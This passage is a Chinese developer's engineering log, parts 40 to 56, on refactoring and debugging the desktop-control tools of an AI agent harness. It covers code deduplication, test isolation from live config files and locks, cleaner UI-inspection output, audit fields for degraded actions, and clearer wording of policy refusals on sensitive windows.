> 模型重试一个已完成的操作，然后开始怀疑工具。所以只有前者值得多等一次确认。

> **延迟只在错的路径上付。** 复查条件写成"指纹相同"，正常路径（确实变了）不受影响。

---

# 第 40 部分：代码质量——三张表、一个 1218 行的函数、一批脆断言

前几轮都在找功能缺陷，这轮只看代码本身。

## 1. 同一个概念三张表，加一个值要改三处

「元素操作 → 中文」有三分：

```python
# tool_desktop.py
_ELEMENT_VERBS = {'invoke': '点击', 'setvalue': '写入', ...}
# tool_activity.py
_DESKTOP_OPERATIONS = {'invoke': '点击', 'setvalue': '写入', ...}   # 与上面一字不差
# approval_view.py
_ELEMENT_OPERATION_LABELS = {'invoke': '点击该控件', 'setvalue': '写入内容', ...}
```

前两张**完全相同**。上一轮加 `scroll` 时我漏改了两处，界面显示「操作」——
这就是重复表的代价。收敛成 `approval_view.ELEMENT_OPERATION_LABELS`（短动词）
+ `_ELEMENT_OPERATION_LABELS`（审批卡完整说法），另两个模块按需 import。

守卫：遍历 `desktop_control_windows.ELEMENT_OPERATIONS`，每张表都必须有中文条目。
再漏就直接红。

## 2. `Invoke-HarnessOp` 1218 行

所有动作（snapshot / list / displays / focus / wait / inspect / element / sequence /
物理输入）都内联在一个函数里。最复杂的 element 分支抽成
`Invoke-ElementAction`：

| | 改前 | 改后 |
| --- | --- | --- |
| Invoke-HarnessOp | 1218 行 | 1022 行 |
| Invoke-ElementAction | — | 202 行 |

`Invoke-ElementOperation` 里"找可滚对象"的 40 行（自己 → 祖先 → 后代）也抽成
`Find-ScrollablePattern`，把 139 行的函数里那段从"读的时候要跳着看"变成一句调用。

## 3. 结构断言太脆：一次重构五条测试同时失效

这些断言原本直接切分发器字符串：

```python
branch = script.split("$payload.action -eq 'element'", 1)[1].split('$action = ', 1)[0]
assert 'walkTarget' in branch
```

把 element 分支抽成函数后，五条一起失败——**代码没错，断言脆**。

改成按函数名取函数体：

```python
def _ps_function(script, name):
    body = script.split(f'function {name}', 1)[1]
    return body.split(chr(10) + 'function ', 1)[0]
```

以后再挪位置都不影响。这类"检查 PowerShell 实现细节"的测试本来就没有别的办法
（PS 那半边没有单测），但至少不该因为函数搬家而报警。

## 收获

> **重复的文案表会在"加一个值"的时候收账。** 上一轮漏改 `scroll` 就是这个原因；
> 收敛成一张 + 覆盖率守卫，比"记得三处都改"可靠得多。

> **大函数的问题不是长，是"读的人找不到入口"。** 抽出来的 `Invoke-ElementAction`
> 名字本身就说明了它干什么，分发器里只剩一行调用。

> **断言实现细节时，要按名字锚定而不是按位置切字符串。** 按位置切的断言会在
> 无关重构时误报，久了就没人信它。

---

# 第 41 部分：把 1622 行 PowerShell 从 Python 模块里拆出去

代码质量第二刀：`desktop_control_windows.py` 2561 行，其中 **1622 行是 PowerShell
源码文本**（63%），Python 逻辑只有 939 行。

## 症状

改 Python 时要在 1600 行 PS 里翻，改 PS 时又要跨过 Python 的 dataclass 和校验函数。
两个语言、两种关注点挤在一个文件里，`Ctrl+F` 都得先想"这是哪半边"。

## 拆法：按「文本 / 逻辑」切

```
desktop_scripts.py          1652 行   三个 PowerShell 常量（装配 / 分发 / 独立进程入口）
desktop_control_windows.py   936 行   Python：dataclass、校验、_run、四个 API
```

接口只有一行：

```python
from desktop_scripts import CONTROL_BODY, CONTROL_MAIN, CONTROL_SETUP
CONTROL_SCRIPT = CONTROL_SETUP + CONTROL_BODY + CONTROL_MAIN   # 独立进程模式用
```

`worker_script()` 仍然是 `PRELUDE + CONTROL_SETUP + CONTROL_BODY + LOOP`，
所以协议一个字没变；`CONTROL_SCRIPT` 这个名字也保留（既有测试按它取整段脚本）。

顺带把 `scripts/profile_desktop.py` 里的 `desktop._CONTROL_SETUP` 改成
`desktop_scripts.CONTROL_SETUP`——它本来就在用私有名，正好一起收拾。

## 为什么按这个缝切，而不是按功能切

更"漂亮"的切法是 `desktop_tree.py` / `desktop_actions.py` / `desktop_input.py`。
但 PowerShell 那边是**一个进程里的一段连续脚本**：函数要共享 `$script:` 状态
（`ProcNames` 缓存、`OperationNote`），拆成多个字符串再拼接只会让拼接顺序变成
新的隐性契约，出错时表现为"运行时变量莫名不存在"。

按文本/逻辑切，拼接口只有一个（三个常量按序拼），而且**它本来就是拼接的**——
`worker_script()` 一直在拼 PRELUDE + SETUP + BODY + LOOP。

## 验证

- `ParseFile` 过了（PS 语法错不会在 import 时暴露，必须单独解析）；
- 278 条桌面相关测试过；
- 真机：`inspect` 47 个控件正常、`displays` 正常、`profile_desktop memory` 正常。

## 收获

> **拆文件要顺着"已经存在的边界"切。** 这套代码本来就按 PRELUDE/SETUP/BODY/LOOP
> 拼接，文本和逻辑的边界是现成的；按功能切则会造出新的拼接契约。

> **PS 语法错在 Python 里是静默的。** 拆完之后必须让 `ParseFile` 单独跑一遍，
> 否则要等到第一次真机调用才发现。

---

# 第 42 部分：清理的收尾——重复的哈希、跨语言的常量、漏掉的英文

继续清代码。这轮找到四类，都不影响功能，但都是"改一处忘一处"的隐患。

## 1. 同一个标题哈希算了五遍

```python
'title_sha1': hashlib.sha1(state.title.encode('utf-8')).hexdigest()
```

审计只记标题的哈希、不记标题本身——这件事在 snapshot / inspect / wait / action /
element 五处各写了一遍。抽成 `_title_sha1(state)`。

## 2. 两条动作路径的审计载荷各写一份

物理输入和元素动作的 `desktop_action` 事件，字段几乎完全一样（action/process/pid/
window_id/duration_ms/title_sha1/sensitive_target）。而 **audit 是按字段白名单落盘的**
——两处各写一份，字段名漂了就会被静默丢掉。抽成 `_action_audit()`。

顺手发现物理路径的错误文案还是英文：`Error: desktop action failed: ...` →
「操作没做成：…」。那轮中文化漏了这一条。

## 3. 跨语言的常量：`MAX_SCROLL = 20` 两边各有一个

Python 校验 `abs(amount) > MAX_SCROLL`，PS 里也写死 `-gt 20` 做钳位。
改 Python 不改 PS 的后果不是报错，而是**静默少滚几格**。改成 Python 随载荷下发
`max_scroll`，PS 只兜底（拿不到才用 20）。

## 4. `tool_screen` 里两处 `Error: {exc}`

中文化那轮把周围的文案都翻了，唯独两个 `except` 分支漏掉。测试里跟着改了三处断言。

## 收获

> **"写五遍"和"写两遍"一样危险。** 五遍里改四处，剩下那处会在某个分支上悄悄不一致；
> 而它恰恰是最少被走到的分支。

> **跨语言的常量要单向流动。** Python 是校验方、PS 是执行方，让值从校验方流向执行方，
> 而不是两边各写一个"20"。

> **中文化要按"字符串出现的位置"扫，不能按文件扫。** 同一轮里 `tool_screen` 翻了
> 五条、漏了两条，因为漏的那两条在 `except` 分支里。

---

# 第 43 部分：这些 bug 是怎么被找到的（方法论）

十轮下来找到 20 多个问题。复盘一下发现途径——这比单个 bug 更有用，
因为**同一类方法还能继续用**。

## 途径一：真机跑一遍（贡献约一半的 bug）

绝大多数问题是**跑起来才暴露的**，不是读代码读出来的：

| bug | 触发方式 |
| --- | --- |
| 中文参数被 GBK 破坏 | 真机 `wait(text='记事本')` |
| `$step` 恒为 0（滚动只走一步） | 真机滚 3 格，数字数发现只挪了 8 项 |
| `ScrollPattern` 没进缓存（可滚动不显示） | 真机看列表项输出，没有「可滚动」 |
| 弹出对话框后回执自相矛盾 | 真机点「打开对话框」，再拿回执点「确定」 |
| 文件对话框「打开」挤不进名单 | 真机开文件对话框，数控件 |
| ComboBox 选不中 | 真机展开→选，失败 |
| 元素引用失效（弹出项被重建） | 同上，报 "不支持但支持" |

关键动作是**照着工具自己的输出做下一步**。十个里有七个是这么暴露的。

## 途径二：问"下一步需要什么"（4 个）

不是找错，是问输出够不够用：

- inspect 说"用 element 模式"，但没给 pid / 窗口号 → 模型只能再调一次 snapshot；
- 控件支持哪些操作采了却从不显示 → 模型只能试错；
- 动作回执只说"完成了" → 无法判断成功；
- 勾选/展开状态没报 → 只能截图看。

## 途径三：扫重复与不一致（4 个）

- 三张「操作→中文」表，两张一字不差（漏改 `scroll` 两次）；
- 同一句文案在 5 处各写一遍（标题哈希）；
- 跨语言各写一个 `MAX_SCROLL = 20`（改一边静默不一致）;
- 六个桌面工具要登记在 8 个地方，漏一个不报错。

这一类靠 `grep` + 矩阵检查。矩阵这条这轮固化成了守卫测试。

## 途径四：读测试覆盖不到的那条路径（3 个）

- worker 协议路径从没被中文参数碰过（测试都注入 runner）；
- PS 那半边没有单测，`$step` 这种拼写错误只能靠真机；
- 「PS 在回、Python 没读」（`state_before`、`note`）——加字段时两侧都要改。

## 途径五：grep 特定模式（3 个）

- 正则里 `\b` 包住中文（中文没有词边界）→ 写脚本扫全仓；
- `return f'Error: …'` 这类漏翻的英文；
- `if ([string]$x.Contains(...))`（`[string]$false` 是 `"False"`，真值）。

## 什么方法找不到 bug

- **单元测试**：全程绿的。它们验的是"我理解的行为"，而我理解的偏差不会体现在里面。
- **ruff**：只报未使用导入、行太长。它抓不到 `$step`、抓不到语义矛盾。
- **读代码**：`if ([string]$x.Contains(...))` 读起来完全正确，只有 `[string]$false` 这个
  细节是真的知识。

## 启示

> **测试跑的是"我以为是怎样的"，真机跑的是"实际是怎样的"。** 两者差的那部分就是 bug 所在。

> **工具输出要当成"下一步的输入"来验。** 输出的每一句都要能直接执行——
> 照着做一遍，缺什么立刻暴露。

> **重复的第二个副本永远不会被测试覆盖到。** 三张表里只有一张在关键的调用路径上，
> 另外两张漂了也没人发现，直到界面上出现一句「操作」。

---

# 第 44 部分：登记矩阵固化成守卫

这轮最后做的一件事：把"六个桌面工具 × 八个登记点"的矩阵从临时脚本变成测试。

```
tool                schema  handler  策略      定时禁用  子代理  同类键  中文标签  审批文案
desktop_snapshot    OK      OK       OK        OK        OK      OK      OK        OK
desktop_inspect     OK      OK       OK        OK        OK      OK      OK        OK
desktop_wait        OK      OK       OK        OK        OK      OK      OK        OK
desktop_displays    OK      OK       OK        OK        OK      OK      OK        OK
desktop_windows     OK      OK       OK        OK        OK      OK      OK        OK
desktop_action      OK      OK       OK        OK        OK      OK      OK        OK
```

"加一个工具"要动八个地方。漏一个不会报错，只会少一层保护或少一句人话。
现在漏了直接红。

审计事件也一并核：`desktop_*` 的每个事件都必须有中文名和飞书图标（没有图标时
卡片上是一片空白）。

---

# 第 45 部分：测试在写真实配置，还把一条测试写坏了

修完 `rules.load()` 的缓存撞键之后，顺手发现更严重的一件事：**测试在改真实的活配置**。

## 现象

`.cache/rules.yaml`（exec_policy 每次判定都读的那个文件）里躺着：

```yaml
rules:
- decision: allow
  tools: [bash]
  prefixes: [npm test]
- decision: deny
  tools: [bash]
  prefixes: [npm publish]
```

这两条是 `tests/test_terminal_views.py` 和 `tests/test_rules_integration.py` 写进去的
——它们调 `rules.write(...)` / `rules.add_rule(...)` 时没传 `path`，于是落到
`DURABLE_PATH`。后果：

1. **测试污染真实行为**：跑完测试后，`npm test` 会被规则自动放行、`npm publish`
   会被规则硬拒——用户没配过这些东西。
2. **更糟**：`test_rules_integration` 为了测"文件损坏"，直接
   `rules.DURABLE_PATH.write_text('rules: [')`。测试中途失败就会把真实规则文件
   留在损坏状态（`load()` 返回 `error`，`add_rule` 会拒绝一切写入）。
3. **测试互相影响**：上一次运行留下的规则让下一次断言时好时坏
   ——`test_add_same_rule_replaces_instead_of_duplicating` 有一半概率失败，
   就是这个原因（不是我以为的随机 flake）。

## 修法

`tests/conftest.py` 加 autouse fixture：把 `rules.DURABLE_PATH` 指到 `tmp_path`，
并清空解析缓存。和既有的 cron 隔离 fixture 是同一套做法。

顺手把被污染的活配置恢复成空规则（内容确认过是测试产物）。

## 缓存撞键（上一节那个 bug）的真因补充

`load()` 的缓存键是 `(路径, mtime_ns, size)`。`note='一'` 和 `note='二'` 的 YAML
**字节数完全相同**，连续两次写入若落在同一时间戳精度内，键就一样 → 读到旧内容
→ "改了规则不生效"，正是这段缓存本来要避免的事。

修法两条：
1. 键里加 `inode`；
2. `write()` 之后**显式失效**该路径的缓存——时间戳精度不足时这是唯一的保证。

## 收获

> **测试写真实路径是最隐蔽的污染。** 它不报错、不留日志，只让"下一次运行"和
> "真实使用"变得不可预测。

> **「偶发失败」先查上一个测试留下的状态。** 这个用例我一开始当成时序 flake，
> 实际是持久化状态串了。

> **缓存键要包含"内容能变的最小单位"。** 文件大小相同、时间戳精度不够时，
> mtime+size 不是身份。

---

# 第 46 部分：走真实入口才发现，"没反应"的复查在每次勾选上都白跑

这轮换个角度：不从能力层直接调，而是走 **`tool_registry`**——模型真正调用的入口。

## 发现

registry 路径本身是通的（inspect 出 pid/窗口号/指纹 → 直接拿去 element 动作 → 状态变化
正确回报）。但顺手看一眼耗时：`toggle` 一次 **789ms**。拆开看：

```
toggle1: 789ms | 状态 checked | 指纹变了 False
toggle2: 535ms | 状态 unchecked | 指纹变了 False
```

上一轮我加的「没有变化时多等 140ms 再走一遍树」**每次勾选都会触发**——
因为指纹刻意不含 `state`（第 30 部分为了"挪窗口不失效"去掉的），勾选一个复选框时
指纹必然不变。于是每次 toggle 白付 140ms + 一次完整遍历。

修法：复查的条件里加一条"目标控件的状态/值没变"。已经看到状态变了，就不必再确认
"是不是真的没反应"。

```powershell
$targetKey = label|name
$targetChanged = (node.state != after.state) or (node.value != after.value)
if (-not $isFocus -and -not $targetChanged -and 指纹相同) { 复查 }
```

修完：`toggle` 789 → 535 → 521ms。而真正"什么都没发生"的路径（对纯文本 invoke）
仍然走复查（1957ms，含它自己那条"不支持元素操作→改点中心"的回退链）。

## 顺手核的另一件事：工具结果会不会撑爆上下文

`desktop_inspect` 一次最多 120 个控件 ≈ 6KB。查了 `_bound_tool_output`：
超过 `TOOL_RESULT_CHAR_LIMIT` 会 middle-out 截断（保头 8000 / 保尾 4000）并落盘。
所以不需要给 inspect 单独加预算——**已有的通用机制覆盖了**。

## 收获

> **"上一个改动"的代价要在最常见的路径上量。** 那次复查是为了救"右键菜单偶尔报没变"，
> 但它的触发条件恰好覆盖了最高频的操作（勾选/输入）。加条件比加延迟划算。

> **走模型真实调用的那一层。** 直接调能力层能验逻辑，但拿不到参数映射、
> 审计注入、以及"这个耗时是不是能被接受"。

> **先查有没有现成机制，再考虑新增。** 工具结果截断早就有了，差点又给 inspect
> 单独写一套。

---

# 第 47 部分：读输出读出来的三处噪声，和一次语言统一

这轮把 `desktop_inspect` 的真实输出当"读者"读了一遍，以及把模型看到的错误文案统一。

## 噪声一：无名的一条行

```
#21 分组 (0,131,2160,1238)
#39 分组
#42 选项卡栏 · 只能按坐标点 (42,0,1595,62)
```

「有趣」的判定原来是 `有名字 or 不是容器 or 可聚焦 or 有操作 or 有值`。
`-not $isContainer` 这条让**所有叶子类型**即使什么都没有也进列表。现在改成
**名字 / 值 / 可用操作 / 可聚焦，四者全无就丢弃**——模型读它没有可做的事。

顺带发现：只有空格的名字能通过 `-ne ''` 检查，输出里看着是空的。改 `.Trim()`。

## 噪声二：5 万像素高的容器

```
#35 分组 "Chat messages" (744,-49759,1104,55340)
```

虚拟化容器给出的矩形毫无意义（旧阈值只检查 |x|,|y| > 100000，高度没管）。
现在超过 20000 的坐标或尺寸一律当作"没有坐标"——控件本身还在，只是不给矩形。

顺带删掉不再使用的 `$script:TREE_CONTAINERS`（判定改了之后它没有消费方）。

## 噪声三：语言割裂

成功是中文、失败是英文：

```
已完成切换「记住我」。
operation_unsupported: that control does not accept a value; it supports: toggle
```

模型是读这些来决定下一步的，中英混排影响判断。把 PS 侧和 Python 侧的运行时原因
统一成中文（**code 保持不变**——审计与测试按 code 匹配）：

```
element_mismatch: 编号和名字对不上：#8 是「记住我」，不是「关闭」；重新调 desktop_inspect
tree_changed: 界面在那次检查之后变了；重新调 desktop_inspect 再用新的编号
operation_unsupported: 这个控件不接受写入内容；它支持：toggle
```

顺手把 `screen_capture` / `ocr_windows` 的 26 条错误文案也翻了（它们本来就被
`截屏失败：` / `识别失败：` 包着，中英各半）。

## 收获

> **"读者视角"能发现代码审查发现不了的问题。** 这些行单看都合法，作为一份给人
> （或给模型）读的清单才显出噪声。

> **判定条件里每多一个 `-not X`，就多一类空壳。** `-not $isContainer` 的本意是
> "叶子控件默认有价值"，实际效果是"任何没名字的东西都算有价值"。

> **code 和 message 要分开对待。** code 是机器契约（审计、测试、模型分流），
> message 是给人/模型读的说明；前者不动，后者才该本地化。

---

# 第 48 部分：又一条"已知偶发"其实是没隔离

这轮修完输出噪声之后，全量里 `test_turn_slot_released_after_turn` 又红了一次。
它被记在"已知偶发"里（注释写"机器上同时跑着网关/TUI 时可能被短暂占用"），
但根因和前一轮的 `rules` 测试是同一类：**测试在用真实路径**。

回合锁的位置跟着会话目录走：

```
<sessions_dir>/../locks/agent-turn.lock
```

而这个用例用 `HarnessApp([])`（不带 store），于是 `SESSIONS_DIR` 是真实的
`.cache`，锁就落在**正在运行的网关/TUI 用的同一把锁**上。满载时被占一下，10 秒
也等不到，就红了。

修法：用 `tmp_path` 里的 store 构造 App，锁自然落到临时目录。和 rules 那条一样，
不是"延长等待"而是"不要用真实资源"。

顺带确认：**`HARNESS_HOME` 换掉时锁会跟着走**（`SESSIONS_DIR` 在 home 下），
所以两个独立的 harness home 本来就不共享回合锁——生产逻辑没问题，纯粹是测试没隔离。

## 收获

> **"已知偶发"里藏着两层东西**：真的时序竞争，和"测试碰了真实资源"。
> 前者只能靠放宽等待或改设计，后者一改就彻底消失。区分方法：
> 看它是否只在"机器上跑着别的实例"时失败。

> **凡是跟着用户目录走的资源，测试都要重定向。** 这轮两条（rules 文件、回合锁）
> 都是同一个模式：常量在 import 时从 `paths.*` 算出来，测试不重定向就直接用真的。

---

# 第 49 部分：三行都标"当前焦点"，和最后一条噪声

## 现象

WindowsTerminal 的控件清单里，三行同时写着「当前焦点」：

```
#1 窗口 "Windows PowerShell" · 当前焦点
#2 面板 · 当前焦点
#6 文本 "Windows PowerShell" · 当前焦点
```

UIA 的 `HasKeyboardFocus` 在**祖先链上也会为真**（Chromium/Terminal 这类提供程序
就是这么实现的）。三行都标，模型就不知道该往哪儿输入——而这个信息恰恰是
"点哪儿"之外最常被用到的一条。

修法：前序遍历里祖先先出、后代后出，所以**最后一个带标记的就是最深那层**。
走完之后只保留它，其余清掉。

## 最后一条噪声：只有坐标的容器

清理完"无操作无坐标"之后还剩：

```
#9 自绘控件 · 只能按坐标点 (0,47,2160,1321)
```

无名、无操作、不可聚焦，只有坐标——占满整屏却什么信息都没有。上一条判定里
我加了 `-or ($bounds.Count -eq 4)` 想让"能点就有价值"，结果把这类容器也放进来了。

最终判定：**要有名字 / 值 / 可用操作 / 可聚焦之一**才占一行；坐标只决定"能不能点"，
不决定"值不值得列"。（之前那条"无操作且无坐标就丢"保留：既要语义、又要能操作。）

实测 WindowsTerminal 从 13 行降到 9 行，剩下的每一行都能做点什么：

```
#1 窗口 "Windows PowerShell"
#2 列表 · 可滚动
#3 选项卡 "powershell.exe" · 可选中
#4 选项卡 "Windows PowerShell" · 已选中 · 可选中
#5 分裂按钮 "新建标签页" · 已收起
#6 文本 "Windows PowerShell" · 当前焦点
#7 标题栏 / #8 菜单栏 / #9 菜单项 "系统"
```

文件对话框仍然 66 个控件、「文件名」和「打开」都在（单父节点上限保住了它们）。

## 收获

> **"能操作"和"值得知道"是两个条件。** 判定里把它们混成一条，总会漏掉一半：
> 只看能操作 → 满屏的容器；只看值得知道 → 给出点不动的名字。

> **提供程序给的布尔值不一定是"排他"的。** `HasKeyboardFocus` 语义上是"这个元素
> 有焦点"，实现上常常是"这个元素或它的后代有焦点"。这类字段必须自己收敛成唯一。

---

# 第 50 部分：那条"已知偶发"不是偶发，是测试自己的竞态

上一轮我把 `test_turn_slot_released_after_turn` 的锁隔离了，以为解决了；连跑 5 次
仍有 1 次失败。继续查。

## 现象

```
AssertionError: one
assert not True
 +  where True = HarnessApp(...)._busy
```

而且失败的那次只跑了 **4.3 秒**，不是等满 10 秒——说明不是"等不到回合"，而是
**回合已经开始、断言提前跑了**。

## 真因

测试的等待条件写错了：

```python
while time.monotonic() < deadline and len(calls) < index:
    ...
assert not app._busy          # ← 一看到 calls 到位就断言
```

`calls.append(...)` 发生在 **worker 线程里的 fake_loop** 内部；而 `_busy` 要等
worker 把整个回合跑完、在 finally 里清掉。两个事件之间有几毫秒到几十毫秒的窗口：

- 空闲机器：断言执行完时 `_busy` 刚好已清 → 一直绿；
- 满载：`calls` 到位、`_busy` 还没清 → 立刻红。

这是**测试的竞态**，不是产品的。之前记成"机器上跑着网关时锁被占用"，方向错了。

## 修法

等两件事**同时**到位：

```python
while ... and (len(calls) < index or app._busy):
```

连跑 10 次全绿。

## 顺带修的一个真问题

`_acquire_turn` 用的是**全局** `harness.SESSIONS_DIR`：

```python
stack.enter_context(turn_slot(harness.SESSIONS_DIR.parent))
```

而不是这个界面正在写的那个会话所在目录。正常使用里两者相同，但界面打开别处的会话
（测试、或将来按项目分目录）时，锁落在全局目录，等于**没锁住真正在写的东西**。
改成跟着 `self._store.path.parent` 走，没有 store 时才回落全局。

这也是我上一轮"改成 tmp store 却没效果"的原因。

## 收获

> **"偶发失败"要先问：是哪两个事件之间的窗口？** 这次窗口只有几十毫秒，而且方向
> 是"断言跑得太早"，不是"目标来得太晚"——耗时数字（4.3s vs 10s）直接指出了这一点。

> **测试等待多个条件时必须同时等。** 分开等（先等 A 再断言 B）在快机器上永远看不出问题。

> **生产代码里的"全局常量"要怀疑它在多实例场景下是否还对。** 全局目录对单实例是对的，
> 对"界面打开了别处的会话"就不对了。

---

# 第 51 部分：我上一轮"发现"的问题里，有一半是我自己造的

继续查的时候撞到一件尴尬事：**上一轮我加的 conftest fixture 是重复的**。
`_isolate_user_rules` 早就存在（`git log -S` 查到是加规则文件那一轮就有的），
我又写了一个 `_isolate_rules_file` 做同样的事。

## 重新理因果

上一轮我断定"测试在写真实 rules.yaml"，证据是文件里躺着：

```yaml
- decision: allow
  prefixes: [npm test]
- decision: deny
  prefixes: [npm publish]
```

这两条确实来自测试。但**它们是更早的运行留下的**（那时还没有隔离 fixture），
不是我开始排查时的状态。而我当时看到的那个 50% 失败，真因是**缓存撞键**
（`note='一'` 和 `note='二'` 字节数相同 + 时间戳精度不足），跟路径污染是两件事，
被我混成一件了。

删掉重复的 fixture，确认隔离仍在（`_isolate_user_rules` 那条），连跑 6 次全绿。

## 教训

> **"文件内容不对"要问是哪一次写进去的。** 我看到的是历史残留，却当成了当前行为，
> 于是"修"了一个已经修好的问题，还多留了一份重复 fixture。

> **加东西之前先 `grep` 一下同类。** 这条本项目已经写进纪律（"要搜同类实现"），
> 这次我搜的是被测代码，没搜 conftest 自己的 fixture。

## 顺带补的两处真问题

1. **`line_repl` 的回合槽也用全局目录**（和上一轮 `harness_app` 同一处不一致）：
   `/resume` 可以打开别的目录下的会话，锁却落在全局 `SESSIONS_DIR`。
   改成跟 `session_store.path` 走。
2. **schema 描述落后于实际行为**：`desktop_inspect` 只写"type, label, current value
   and screen rectangle"，但现在已经输出状态（已勾选/已展开/只读）和可用操作；
   `desktop_action` 只写"mouse or keyboard input"，没说是两种模式。模型先读描述再决定
   调不调，描述落后就等于功能隐藏。

---

# 第 52 部分：同一段"按 store 定位"的逻辑写了三遍

上一轮修 `harness_app` 的回合锁位置时，我说"跟着会话走而不是全局目录"。这轮把
同类位置全找了一遍，发现**三处都在做同一件事，而且都写成了内联代码**：

```python
# ui/harness_app.py  (上一轮)
store_path = getattr(self._store, 'path', None) ...
# line_repl.py        (上一轮)
store_path = getattr(session_store, 'path', None) ...
# ui/session_actions.py (/rename，本轮才发现，还是全局目录)
with session_write(harness.SESSIONS_DIR, self._store.session_id, ...)
```

第三处 `/rename` 漏了：界面打开别处的会话时，重命名拿的是全局目录的锁，锁住的不是
真正在写的文件。同一个 bug 在三个入口各出现一次。

## 收敛成一个 helper

```python
# session_locks.py
def sessions_dir_for(store=None) -> Path:
    path = getattr(store, 'path', None)
    if path is not None:
        return Path(path).parent
    import harness
    return Path(harness.SESSIONS_DIR)
```

三处改成一行调用。**放在 `session_locks` 里**而不是各处内联：锁的路径本来就由它决定
（`lock_path()` 是 `sessions_dir.parent / 'locks' / ...`），"目录从哪来"和"锁放哪去"
应该在一个模块里。

## 收获

> **修一处"这类问题"时，要把同类位置全扫一遍。** 我上一轮只改了报错的那一处，
> 这轮才补上第三个。

> **重复的内联逻辑是 bug 的温床。** 三处各写一遍 `getattr(store, 'path')`，结果两处
> 修了、一处没修。抽成函数之后，"改用哪个目录"只有一个答案。

---

# 第 53 部分：审计里看不出"这次没按批准的方式做"

原子动作有三种收尾方式，但审计只记了一种：

| 实际发生 | 回执有没有说 | 审计有没有记 |
| --- | --- | --- |
| 按控件编号走 UIA | —— | `action=element, operation=invoke` |
| 控件没暴露元素级操作 → **降级成物理点击** | 有（note） | 一个字都没有 |
| 控件被重建 → 重新定位后再执行 | 有（note） | 一个字都没有 |

后两种的共同点是：**结果和用户批准的事情不完全一样**。用户批的是"按 #5 号控件
执行 invoke"，实际却动了鼠标；台账上看起来仍然是"一次元素动作"，事后无法分辨。

## 修法

PS 侧给出机器可读的标记（不靠 note 的字符串匹配）：

```powershell
$degraded = ''                       # 正常
$degraded = 'relocated'              # 控件被重建，重新定位后执行
$degraded = 'click'                  # 降级成物理点击
```

`ActionResult.degraded` → 审计白名单加一列 → 台账里能看到 `degraded=click`。

顺带：`_action_audit` 现在**丢弃空值**。之前 `degraded=''` 会落成一列空字段，
台账多一列噪音；`steps`/`duration_ms` 这类有零值意义的字段不受影响（0 已排除在
"去掉"之外时再确认——这里是 `(None, '', 0)`，而 `steps=0` 本来也不该出现）。

## 收获

> **审计要记"偏离"，不只记"结果"。** 用户批准的是一个具体动作；agent 为了做成
> 这件事换了一种方式，这恰恰是最该留痕的地方——它不是错误，但也不是批准过的那个动作。

> **让"偏离"变成机器可读的字段，而不是一句人话。** note 是给人看的，它是字符串，
> 想统计"降级发生了多少次"就得靠正则去猜。

---

# 第 54 部分：两处"口径不一致"，都在字符串处理上

## 一、等待与 expect 的匹配规则不同

`wait` 找目标控件用的是 `name + value + **label**`（label 是中文类型名，
「按钮」「输入框」），而元素动作核对 `expect` 用的是 `name + value`。

于是：

```
wait(text='按钮')      → 命中任意一个按钮
wait(text='记住我')    → 按名字命中（正常）
```

而 schema 里 `text` 写的是「控件名或值」，`label` 从来没被广告过。模型按文档写
`wait(text='按钮')` 会得到一个"意外成功"——等到了它根本没指名的控件。

修法：两边统一成 `name + value`。（这条是我自己上几轮写的，没有外部依赖，
所以直接对齐口径，不留兼容分支。）

## 二、`wait` 的文本没走清洗

`_clean()`（去零宽字符、丢 GBK 编不了的字符）在 `_clip()` 里统一执行，用于控件名、
值、标题。但 `wait` 的 `needle` 是**用户/模型给的原文**，直接拼进了输出：

```python
text = f'{elapsed}内没等到「{needle}」{verb}。'
```

控件名里实测有 U+200B，模型照着复述一遍就带进来了。改成先 `_clean`，
输出处再 `_clip`。顺手 `result.note`（含控件名）也过一遍清洗。

## 收获

> **两条路径比对同一个概念时，判据必须字面一致。** 「什么算匹配」这种事一旦两边
> 各写一份，模型就会在 A 路径成功、B 路径失败，然后开始怀疑工具。

> **凡是"拼进输出"的外部字符串都要过清洗，不管它看起来多干净。** 这次漏的是
> 模型自己给的那一段——它最可能原样复述屏幕上的怪字符。

---

# 第 55 部分：把"拒绝"说成"失败"，还附一句错误的建议

敏感窗口的拒绝消息，原本在工具层长这样：

```
读不到这个窗口的界面结构：sensitive_target: 这个窗口看起来是密码、支付或验证码页面，
所以不提供界面结构；请让用户自己操作。可以先让用户切到目标窗口，或改用 desktop_snapshot 看前台窗口。
```

三处都不对：

1. **「读不到」= 故障**。实际是按策略不做。两者的正确反应完全不同：故障可以换
   参数重试，拒绝只能交给用户。
2. **`sensitive_target:` 这个 code 直接怼在给模型看的话里**，前面还套着一层失败
   前缀，读起来像"技术性报错"。
3. **末尾建议自相矛盾**：「请让用户自己操作」后面紧跟「可以先让用户切到目标窗口，
   或改用 desktop_snapshot」——后者是"再试试"，而用户切到同一个窗口不会改变
   「这是密码页面」这个判断。

## 修法

工具层区分两类异常：`_REFUSAL_CODES`（sensitive_target / process_excluded /
must_do_self / password_field / terminal_input）表示"按策略不做"，其余表示"没做成"。

- 拒绝：原样转述。消息里已经写清原因和"请用户自己操作"，再加前缀与建议只会
  引入错误的下一步。
- 失败：保留原有前缀与"换个办法"的建议（这时建议是对的）。

三处都改（`inspect` / `wait` / `action`）。Python 侧的参数校验错误（"click 需要
整数 x 和 y"）不带 code 前缀，落不进拒绝集合，行为不变。

## 收获

> **拒绝和失败要对模型说成两件事。** 它们的下一步动作不一样：一个是"换参数"，
> 一个是"找人"。措辞混了，模型就会去重试那些注定不会成功的事。

> **别在拒绝消息后面附"再试试"的建议。** 建议是给"没做成"的：拒绝的前提就是
> 这条路走不通，换了还是走不通。

---

# 第 56 部分：同一个拒绝，两条传输给出两句话

上一节把"拒绝"和"没做成"分开报，靠的是异常串的 `code:` 前缀。查这个前缀是谁拼的，
发现它在 `ps_worker._failure_text()` 里：

```python
if message and code and code not in message:
    return f'{code}: {message}'
```

## 但独立进程路径没走它

桌面控制有两条传输：

| 路径 | 失败串 |
| --- | --- |
| 常驻 worker（默认） | `sensitive_target: 这个窗口看起来是…` |
| 独立进程（`HARNESS_PS_WORKER=0`） | `这个窗口看起来是…`（没有 code） |

于是上游按前缀分流时，第二条路上判不出"这是拒绝"，又会套回「读不到…」并附一句
"换个办法试试"。**同一个窗口、同一句拒绝，两句话。**

修法：`_failure_text` 提成公开的 `ps_worker.failure_text()`，两条传输共用。
实测确认两条现在逐字符相同。

## 这暴露的一件事

> **"分流逻辑"依赖的格式，必须在所有生产该格式的地方统一。** 我在工具层加了
> `_is_refusal()` 去认 `code:` 前缀，却没检查这个前缀是"某一条传输"独有的——
> 一个只在默认路径成立的约定，等于把 bug 藏进了降级路径。

> **降级路径没人天天跑，正因如此它最容易悄悄偏离。** 加完这条守卫（两条传输
